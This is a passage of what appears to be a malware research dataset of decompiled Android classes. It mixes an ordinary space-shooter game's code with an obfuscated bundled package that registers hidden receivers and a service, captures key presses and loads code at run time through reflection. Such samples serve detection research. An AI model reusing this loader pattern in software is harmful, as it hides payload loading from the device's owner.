if (doneOnce) {         vaisseaux[6].recreate(TextureUtil.loadTexture(""mine.png""));       }  else {         vaisseaux[6]=new Model3D(""mine.obj"",1724,-2978,2340,TextureUtil.loadTexture(""mine.png""));       }       ombres[6]=new Ombre(34406,81920);       flashs[6]=new Flash(0,-3,3,TextureUtil.loadTexture(""red.png""),true);       doneOnce=true;       textParts1=TextureUtil.loadTexture(""parts1.png"");       textParts2=TextureUtil.loadTexture(""parts2.png"");       textParts3=TextureUtil.loadTexture(""parts3.png"");       textExplosion[0]=TextureUtil.loadTexture(""explosion1.png"");       textExplosion[1]=TextureUtil.loadTexture(""explosion2.png"");       textExplosion[2]=TextureUtil.loadTexture(""explosion3.png"");       textExplosion[3]=TextureUtil.loadTexture(""explosion4.png"");       textExplosion[4]=textExplosion[2];       textExplosion[5]=textExplosion[1];       textExplosion[6]=textExplosion[2];       textExplosion[7]=textExplosion[3];       textExplosion[8]=TextureUtil.loadTexture(""explosion5.png"");       textExplosion[9]=TextureUtil.loadTexture(""explosion6.png"");       Vaisseau.leftParticules=new Rect3D(-16,2,-16,16,32,textParts1);       Vaisseau.rightParticules=new Rect3D(16,2,-16,16,32,textParts1);       Vaisseau.explosion1=new Rect3D(0,-5,-11,90,90,textExplosion[0],true);       Vaisseau.explosion2=new Rect3D(0,-5,-11,140,140,textExplosion[0],true);       heyItsOkayImAlreadyInitializedYeahYeahJustDoNothingItWillBeOkay=true;     }   }   public static boolean changeExplosion1(){     Vaisseau.explosion1.setTexture(textExplosion[explosion1Part]);     explosion1Part++;     explosion1Part%=10;     return explosion1Part != 0;   }   public static boolean changeExplosion2(){     Vaisseau.explosion2.setTexture(textExplosion[explosion2Part]);     explosion2Part++;     explosion2Part%=10;     return explosion2Part != 0;   }   public static void changeMissile(){     flashs[5].setTexture(textExplosion[missilePart]);     missilePart++;     missilePart%=10;   }   public static void changeParticules(){     changeMissile();     parts++;     parts%=3;     if (parts == 0) {       Vaisseau.leftParticules.setTexture(textParts1);       Vaisseau.rightParticules.setTexture(textParts3);       return;     }     if (parts == 1) {       Vaisseau.leftParticules.setTexture(textParts2);       Vaisseau.rightParticules.setTexture(textParts1);       return;     }     if (parts == 2) {       Vaisseau.leftParticules.setTexture(textParts3);       Vaisseau.rightParticules.setTexture(textParts2);       return;     }     if (parts == 3) {       Vaisseau.leftParticules.setTexture(textParts1);       Vaisseau.rightParticules.setTexture(textParts1);       return;     }     if (parts == 4) {       Vaisseau.leftParticules.setTexture(textParts3);       Vaisseau.rightParticules.setTexture(textParts3);       return;     }     if (parts == 5) {       Vaisseau.leftParticules.setTexture(textParts2);       Vaisseau.rightParticules.setTexture(textParts2);       return;     }     if (parts == 6) {       Vaisseau.leftParticules.setTexture(textParts3);       Vaisseau.rightParticules.setTexture(textParts1);     }  else     if (parts == 7) {       Vaisseau.leftParticules.setTexture(textParts1);       Vaisseau.rightParticules.setTexture(textParts2);     }  else     if (parts == 8) {       Vaisseau.leftParticules.setTexture(textParts2);       Vaisseau.rightParticules.setTexture(textParts1);     }   }   public static void reMakeShip(  Vaisseau v){     v.model3d=vaisseaux[v.mid];     v.setOmbre(ombres[v.mid]);     v.setFlash(flashs[v.mid]);     v.texOmbre=TextureUtil.loadTexture(texturess[v.mid][0]);   }   public static Vaisseau makeShip(  int type){     Vaisseau v=new Vaisseau(texturess[type][0],baseYAngle[type]);     v.mid=type;     v.model3d=vaisseaux[type];     v.setOmbre(ombres[type]);     v.setFlash(flashs[type]);     v.sizeX=0.4f;     v.sizeY=0.25f;     v.sizeZ=0.4f;     for (int i=0; i < v.params.length; i++) {       v.params[i]=defaultParams[type][i];     }     if (type == 5) {       v.setZ(-1);       v.isShip=false;       v.type=Vaisseau.MISSILE1;     }     if (type == 6) {       v.setZ(-1);       v.isShip=false;       v.type=Vaisseau.MINES;       v.sizeX=1.0f;       v.sizeY=1.0f;       v.sizeZ=1.0f;     }     return v;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turboflydemo\JumpyBall.code","public class JumpyBall extends net.osaris.turbofly.JumpyBall {   @Override public void onCreate(  Bundle savedInstanceState){     essai=true;     COREAN=false;     chinese=false;     essai=true;     fullURL=""market://details?id=net.osaris.turbofly"";     super.onCreate(savedInstanceState);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turboflydemo_kr\JumpyBall.code","public class JumpyBall extends net.osaris.turbofly.JumpyBall {   @Override public void onCreate(  Bundle savedInstanceState){     COREAN=true;     chinese=true;     essai=true;     fullURL=""market://details?id=net.osaris.turbofly_kr"";     super.onCreate(savedInstanceState);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly_jp\JumpyBall.code","public class JumpyBall extends net.osaris.turbofly.JumpyBall {   @Override public void onCreate(  Bundle savedInstanceState){     COREAN=false;     japanese=true;     dev=true;     KEYONLY=false;     super.onCreate(savedInstanceState);     AppDriverTracker.requestAppDriver(this,6067,""5d8f6a28103f03e33e2f875759d735db"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly_kr\JumpyBall.code","public class JumpyBall extends net.osaris.turbofly.JumpyBall {   @Override public void onCreate(  Bundle savedInstanceState){     COREAN=true;     chinese=true;     super.onCreate(savedInstanceState);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly_sa\JumpyBall.code","public class JumpyBall extends net.osaris.turbofly.JumpyBall {   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.qhi\mjol.code","public class mjol {   public static void START(  Context context){     kh.amrw(context,""319f447e884120a27d04b1b5dbadec52"").ygx(context);     kh.amrw(context).o(context);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\a.code","public final class a {   public static String a="""";   public static String b="""";   public static String c="""";   public static String d="""";   public static String e="""";   public static String f="""";   public static String g="""";   public static String h="""";   public static String i="""";   public static String j="""";   public static String k="""";   public static String l="""";   public static String m="""";   public static String n="""";   public static String o="""";   public static String p="""";   public static String q="""";   public static String r="""";   public static String s="""";   public static String t="""";   public static String u="""";   public static String v="""";   public static String w="""";   public static String x="""";   public static String y="""";   public static String z="""";   public static String A="""";   public static String B="""";   public static String C="""";   public static String D="""";   public static String E="""";   public static String F="""";   public static String G="""";   public static String H="""";   public static String I="""";   public static String J="""";   public static List K=new ArrayList();   public static String L="""";   public static String M=""mJTG"";   private static int R=0;   public static String N="""";   public static String O="""";   public static String P="""";   public static String Q="""";   public static void a(  android.content.Context r6){     throw new UnsupportedOperationException(""Method not decompiled: ywy.keft.ahj.adao.ydc.a.a(android.content.Context):void"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\aj.code","public class aj extends Activity {   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     requestWindowFeature(1);     g a=g.a(this,a.b);     a.a(a.r,this,Activity.class);     a.a(a.s,bundle,Bundle.class);     b.b(getApplicationContext());   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     b.a(this,i,keyEvent);     return true;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\b.code","public final class b {   private static boolean a=true;   public static void a(  Activity activity,  int i,  KeyEvent keyEvent){     if ("""".equals(a.b)) {       a.a(activity.getApplicationContext());     }     g.a(activity,a.b).a(a.w,new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class});   }   public static void a(  Context context){     c(context);     b(context,a.q);   }   public static void a(  Context context,  int i){     a(context,a.J,context,Integer.valueOf(i),Context.class,Integer.TYPE);   }   public static void a(  Context context,  Intent intent){     try {       if ("""".equals(a.a)) {         a.a(context);         b(context);       }       g.a(context,a.a).a(a.t,new Object[]{context,intent},new Class[]{Context.class,Intent.class});     }  catch (    Exception e) {       e.printStackTrace();     }   }   public static void a(  Context context,  String str){     c(context);     a(context,a.q,context,str,Context.class,String.class);   }   private static void a(  Context context,  String str,  Object obj,  Object obj2,  Class cls,  Class cls2){     g.a(context,a.c).a(str,new Object[]{obj,obj2},new Class[]{cls,cls2});   }   public static void a(  Context context,  String str,  String str2){     c(context);     g.a(context,a.c).a(a.q,new Object[]{context,str,str2},new Class[]{Context.class,String.class,String.class});   }   public static void a(  Context context,  boolean z){     a(context,a.g,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);   }   public static void a(  Context context,  boolean z,  boolean z2){     a(context,a.I,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);     b(context,z2);   }   public static void b(  Context context){     new d();     d.a(context);   }   public static void b(  Context context,  String str){     g.a(context,a.c).a(str,context,Context.class);   }   public static void b(  Context context,  boolean z){     a(context,a.i,context,Boolean.valueOf(z),Context.class,Boolean.TYPE);   }   private static void c(  Context context){     a.a(context);     e.a(context);     a(context,a.E,context,ywb.class.getName(),Context.class,String.class);     a(context,a.d,context,aj.class.getName(),Context.class,String.class);     a(context,a.G,context,jmn.class.getName(),Context.class,String.class);     b(context.getApplicationContext());   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\c.code","public final class c {   public static String a=a.n;   public static String b=a.N;   public static String c=a.O;   public static String d=a.P;   public static String e=a.Q;   private static c h;   private Class f;   private Object g;   private Object a(  String str,  Object[] objArr,  Class[] clsArr){     return h.a(this.f,this.g,str,objArr,clsArr);   }   public static c a(  Context context){     if (h == null) {       h=new c();       String str=context.getDir(a.o,0).getAbsolutePath() + ""/"";       c cVar=h;       String str2=str + a;       try {         cVar.f=Class.forName(b);         cVar.g=cVar.f.getConstructor(String.class,String.class,String.class,Class.forName(e)).newInstance(str2,str,"""",context.getClassLoader());       }  catch (      Exception e2) {         e2.printStackTrace();       }     }     return h;   }   public final Class a(  String str){     return (Class)a(c,new Object[]{str},new Class[]{String.class});   }   public final void a(){     a(d,new Object[0],new Class[0]);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\d.code","public final class d {   private static ywb a=null;   private static boolean b=false;   public static void a(  Context context){     if (b && a != null) {       try {         b=false;         context.unregisterReceiver(a);       }  catch (      Exception e) {         e.printStackTrace();       }     }     try {       IntentFilter intentFilter=new IntentFilter();       intentFilter.addAction(a.y);       intentFilter.addAction(a.z);       intentFilter.addDataScheme(a.A);       if (a == null) {         a=new ywb();       }       context.registerReceiver(a,intentFilter);       b=true;     }  catch (    Exception e2) {       e2.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\e.code","public final class e {   private static boolean a=true;   public static void a(  android.content.Context r12){     throw new UnsupportedOperationException(""Method not decompiled: ywy.keft.ahj.adao.ydc.e.a(android.content.Context):void"");   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\f.code","public final class f {   public static Object a(  Class cls){     try {       return cls.getConstructor(new Class[0]).newInstance(new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static Object a(  String str,  Object[] objArr,  Class[] clsArr,  Class cls,  Object obj){     try {       Method declaredMethod=cls.getDeclaredMethod(str,clsArr);       declaredMethod.setAccessible(true);       return declaredMethod.invoke(obj,objArr);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\g.code","public final class g {   private static g g;   private c c;   private Class d;   private Object e;   private String f;   public static String a=a.n;   public static String b=a.p;   private static String h="""";   public static g a(  Context context,  String str){     if (g == null) {       g gVar=new g();       g=gVar;       gVar.a(context);       g.b(str);     }  else     if (!g.f.equals(str)) {       g.c.a();       g.a(context);       g.b(str);     }     return g;   }   private void a(  Context context){     try {       this.c=c.a(context);     }  catch (    Exception e) {       e.printStackTrace();     }   }   private void b(  String str){     this.f=str;     try {       this.d=this.c.a(str);       this.e=f.a(this.d);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public final Object a(  String str){     return a(str,new Object[0],new Class[0]);   }   public final Object a(  String str,  Object obj,  Class cls){     return a(str,new Object[]{obj},new Class[]{cls});   }   public final Object a(  String str,  Object[] objArr,  Class[] clsArr){     return f.a(str,objArr,clsArr,this.d,this.e);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\h.code","public final class h {   public static Object a(  Class cls,  Object obj,  String str,  Object[] objArr,  Class[] clsArr){     try {       Method method=cls.getMethod(str,clsArr);       method.setAccessible(true);       return method.invoke(obj,objArr);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\jmn.code","public class jmn extends Service {   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     super.onCreate();     a.a(getApplicationContext());     b.b(getApplicationContext());     g a=g.a(getApplicationContext(),a.F);     a.a(a.r,getApplicationContext(),Context.class);     a.a(a.s);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\kh.code","public class kh {   private static kh a;   public static kh amrw(  Context context){     if (a == null) {       a=new kh();     }     b.a(context);     return a;   }   public static kh amrw(  Context context,  String str){     if (a == null) {       a=new kh();     }     b.a(context,str);     return a;   }   public static kh amrw(  Context context,  String str,  String str2){     if (a == null) {       a=new kh();     }     b.a(context,str,str2);     return a;   }   public void f(  Context context){     b.b(context,a.L);   }   public void i(  Context context){     b.b(context,a.l);   }   public void o(  Context context){     b.b(context,true);     i(context);   }   public void p2(  Context context,  boolean z,  boolean z2){     b.a(context,z,z2);   }   public void p3(  Context context,  boolean z){     b.a(context,z);   }   public void p4(  Context context,  int i){     b.a(context,i);   }   public void x(  Activity activity){     b.b(activity,a.D);   }   public void ygx(  Context context){     b.b(context,a.k);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\n.code","public class n {   public static boolean o(  String str){     if (str != null) {       try {         if (!"""".equals(str)) {           if (System.currentTimeMillis() > new SimpleDateFormat(""yyyy-MM-dd hh:mm"").parse(str).getTime()) {             return true;           }         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return false;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\ywy.keft.ahj.adao.ydc\ywb.code","public class ywb extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     b.a(context.getApplicationContext(),intent);   } } "
